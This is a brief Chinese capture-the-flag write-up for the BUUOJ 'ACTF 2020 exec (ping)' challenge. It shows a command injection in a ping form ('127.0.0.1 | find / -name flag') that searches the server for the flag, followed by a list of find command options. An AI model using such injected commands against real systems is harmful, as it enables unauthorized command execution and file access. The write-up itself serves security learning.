### buuoj_ACTF 2020 新生赛 exec（ping）

首先随便ping一个试试水

![](https://pic.imgdb.cn/item/60fab3305132923bf80cf4c8.jpg)

然后找一下有没有flag文件

![](https://pic.imgdb.cn/item/60fab3545132923bf80d5858.jpg)

输入

```
127.0.0.1 | find / -name flag		#从根目录开始查找
```

> 补充find命令
>
> -name   filename               #查找名为filename的文件
> -perm                                #按执行权限来查找
> -user    username             #按文件属主来查找
> -group groupname            #按组来查找
> -mtime   -n +n                   #按文件更改时间来查找文件，-n指n天以内，+n指n天以前
> -atime    -n +n                   #按文件访问时间来查找文件，-n指n天以内，+n指n天以前
> -ctime    -n +n                  #按文件创建时间来查找文件，-n指n天以内，+n指n天以前
> -nogroup                          #查无有效属组的文件，即文件的属组在/etc/groups中不存在
> -nouser                            #查无有效属主的文件，即文件的属主在/etc/passwd中不存
> -type    b/d/c/p/l/f             #查是块设备、目录、字符设备、管道、符号链接、普通文件
> -size      n[c]                    #查长度为n块[或n字节]的文件
> -mount                            #查文件时不跨越文件系统mount点
> -follow                            #如果遇到符号链接文件，就跟踪链接所指的文件
> -prune                            #忽略某个目录

找到了文件，直接输出就行

![](https://pic.imgdb.cn/item/60fab4125132923bf80f6ed7.jpg)